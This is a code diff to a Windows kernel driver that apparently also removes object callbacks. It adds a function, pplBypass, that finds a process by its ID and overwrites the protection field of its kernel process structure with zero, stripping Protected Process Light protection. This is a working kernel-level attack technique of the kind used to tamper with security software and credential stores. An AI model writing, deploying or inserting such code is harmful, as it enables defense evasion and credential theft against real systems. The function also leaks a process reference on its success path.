@@ -520,6 +520,36 @@ NTSTATUS RemObjCallbackNotifyRoutineAddress() {
     return 0;
 }
 
+NTSTATUS pplBypass(UINT64 pidVal, int offset) {
+	NTSTATUS status;
+
+    PEPROCESS eProcess = NULL;
+    status = PsLookupProcessByProcessId((HANDLE)pidVal, &eProcess);
+
+    if (!NT_SUCCESS(status)) {
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
+            "[%s] PsLookupProcessByProcessId failed for PID %llu (0x%08X)\n",
+            DRIVER_NAME, (unsigned long long)pidVal, status);
+        return STATUS_UNSUCCESSFUL;
+	}
+	DbgPrintEx(0, 0, "protection: 0x%llx\n", *(PUINT64)((UINT64)eProcess + offset));
+
+	//_PS_PROTECTION protection = *(_PS_PROTECTION*)((UINT64)eProcess->Protection);
+
+	*(PUINT64)((UINT64)eProcess + offset) = 0;
+
+	DbgPrintEx(0, 0, "new protection: 0x%llx\n", *(PUINT64)((UINT64)eProcess + offset));
+    if (*(PUINT64)((UINT64)eProcess + offset) == 0) {
+        DbgPrintEx(0, 0, "[%s] Successfully removed PPL protection for PID %llu\n", DRIVER_NAME, (unsigned long long)pidVal);
+    }
+    else {
+        DbgPrintEx(0, 0, "[%s] Failed to remove PPL protection for PID %llu\n", DRIVER_NAME, (unsigned long long)pidVal);
+        ObDereferenceObject(eProcess);
+        return STATUS_UNSUCCESSFUL;
+    }
+	return STATUS_SUCCESS;
+
+}
 
 UINT64 FindKernelBase() {
     UNICODE_STRING functionName;
